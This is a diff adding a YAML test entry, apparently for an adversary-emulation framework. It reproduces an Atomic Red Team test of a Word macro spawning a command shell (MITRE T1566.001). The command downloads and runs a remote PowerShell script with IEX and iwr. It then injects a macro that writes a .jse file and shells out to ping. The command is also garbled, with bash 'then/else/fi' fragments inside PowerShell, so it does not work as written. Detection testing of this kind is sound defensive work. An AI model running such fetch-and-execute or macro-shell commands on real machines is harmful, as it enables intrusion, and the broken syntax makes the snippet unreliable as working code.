@@ -1,0 +1,58 @@
+- id: cbb6799a-425c-4f83-9194-5447a909d67f
+  name: Word spawned a command shell and used an IP address in the command line
+  description: 'Word spawning a command prompt then running a command with an IP address
+    in the command line is an indicator of malicious activity.
+
+    Upon execution, CMD will be launched and ping 8.8.8.8.'
+  tactic: initial-access
+  technique:
+    attack_id: T1566.001
+    name: 'Phishing: Spearphishing Attachment'
+  platforms:
+    windows:
+      psh:
+        command: 'try {; New-Object -COMObject "Word.Application" | Out-Null; $process
+          = "Word"; then : ; else Write-Host "You will need to install Microsoft Word
+          manually to meet this requirement"; fi; [Net.ServicePointManager]::SecurityProtocol
+          = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); $macrocode = "   Open `"C:\Users\Public\art.jse`" For
+          Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping
+          8.8.8.8`"`n"; Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"'
+        cleanup: 'Remove-Item #{jse_path} -ErrorAction Ignore'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1566.001
+  - initial-access
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      jse_path:
+        description: 'Path for the macro to write out the "malicious" .jse file
+
+          '
+        type: string
+        default: C:\Users\Public\art.jse
+      ms_product:
+        description: Maldoc application Word or Excel
+        type: string
+        default: Word
+    dependencies:
+    - description: 'Microsoft #{ms_product} must be installed
+
+        '
+      prereq_command: "try {\n  New-Object -COMObject \"#{ms_product}.Application\"\
+        \ | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\")\
+        \ {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch\
+        \ { exit 1 }\n"
+      get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
+        manually to meet this requirement"
+
+        '
+    technique_created: '2020-03-02T19:05:18.137Z'
+    atomic_guid: cbb6799a-425c-4f83-9194-5447a909d67f
+    import_timestamp: '2025-06-24T11:15:07.859672Z'
